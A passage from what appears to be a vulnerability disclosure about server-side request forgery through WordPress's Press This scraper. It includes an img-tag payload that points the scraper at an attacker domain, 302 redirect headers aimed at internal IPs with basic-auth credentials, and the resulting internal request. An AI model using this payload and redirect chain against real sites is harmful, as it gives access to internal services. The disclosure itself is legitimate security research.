The valid host will then reply with a crafted header targeting `location: http://[privateip]:[port]` like *192.168.01, 127.0.01:11211 ..* resulting in the final SSRF. The redirect can also include a basic-auth which the server adds as a **Authorization** header.\n\n#PoC\nThe PoC is very similar to #110801 but with a addition of a valid domain which replies with a redirection header and http code.\n\nVictim has privileges to use press-this of example.com\n\n- Victim has a session running\n- Victim gets a payload similar to `<img src=\"//example.com/wp-admin/press-this.php?u=http://attackers-domain.com&url-scan-submit=Scan\" />\n- Victim sends a scrape request to attackers-domain.com\n- Attackers domain replies with a 302 and a location header \n```\nLocation: http://192.168.0.1:12345\n```\n- Server blindly follows redirect and the internal ip gets hit.\n\nThis can be escalated by adding a basic auth scheme to the redirect url as\n```\nLocation: http://admin:admin@192.168.0.1:12345\n```\n\nListening to the SSRF on 192.168.0.1 would yield a incoming HTTP from the victims server carrying a basic-auth header crafted towards the internal endpoint.\n```\nGET / HTTP/1.1\nHost: 192.168.0.1:12345\nAuthorization: Basic YWRtaW46YWRtaW4=\nUser-Agent: Press This (WordPress/4.7-RC1);\nAccept: */*\nAccept-Encoding: deflate, gzip\nReferer: http://admin:admin@192.168.0.1:12345/\nConnection: close\n```\n\n",

The valid host will then reply with a crafted header targeting <code>location: http://[privateip]:[port]</code> like <em>192.168.01, 127.0.01:11211 ..</em> resulting in the final SSRF.
